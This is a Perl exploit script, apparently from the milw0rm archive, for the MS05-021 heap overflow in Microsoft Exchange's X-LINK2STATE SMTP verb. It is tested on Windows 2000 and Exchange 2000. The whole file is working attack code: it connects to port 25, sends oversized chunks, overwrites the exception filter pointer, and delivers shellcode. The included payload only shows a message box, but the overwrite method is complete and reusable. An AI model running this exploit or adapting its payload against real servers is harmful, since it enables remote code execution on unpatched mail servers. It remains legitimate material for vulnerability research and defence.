#!/bin/perl
#
#
# MS05-021 Exchange X-LINK2STATE Heap Overflow
# Author: Evgeny Pinchuk
# For educational purposes only.
# 
# Tested on:
# Windows 2000 Server SP4 EN
# Microsoft Exchange 2000 SP3
# 
# Thanks and greets: 
# Halvar Flake (thx for the right directions)
# Alex Behar, Yuri Gushin, Ishay Sommer, Ziv Gadot and Dave Hawkins
# 
#

use IO::Socket::INET;

my $host = shift(@ARGV);
my $port = 25;
my $reply;
my $request;
my $EAX="\x55\xB2\xD3\x77"; # CALL DWORD PTR [ESI+0x4C] (rpcrt4.dll) 
my $ECX="\xF0\xA1\x5C\x7C"; # lpTopLevelExceptionFilter
my $JMP="\xEB\x10";


my $SC="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb\xD5\x01" .
"\x59\x7C\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x5F" .
"\x0C\x59\x7C\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0D\x31\xd2\x52\x51" .
"\x51\x52\xff\xd0\x31\xd2\x50\xb8\x72\x69\x59\x7C\xff\xd0\xe8\xc4\xff" .
"\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff" .
"\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff" .
"\xff\x4D\x53\x30\x35\x2D\x30\x32\x31\x20\x54\x65\x73\x74\x4e";

my $cmd="X-LINK2STATE CHUNK=";

my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die "Cannot connect to host!\n";

recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
$request = "EHLO\r\n";
send $socket, $request, 0;
print "[+] Sent EHLO\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
$request = $cmd . "A"x1000 . "\r\n";
send $socket, $request, 0;
print "[+] Sent 1st chunk\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
$request = "A"x30 . $JMP . $EAX . $ECX . "B"x100 . $SC;
my $left=1000-length($request);
$request = $request . "C"x$left;
$request = $cmd . $request . "\r\n";
send $socket, $request, 0;
print "[+] Sent 2nd chunk\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
close $socket;
$socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die "Cannot connect to host!\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
$request = "EHLO\r\n";
send $socket, $request, 0;
print "[+] Sent EHLO\n";
recv($socket, $reply, 1024, 0);
print "Response:" . $reply;
$request = $cmd . "A"x1000 . "\r\n";
send $socket, $request, 0;
print "[+] Sent 3rd chunk\n";

close $socket;

# milw0rm.com [2005-04-19]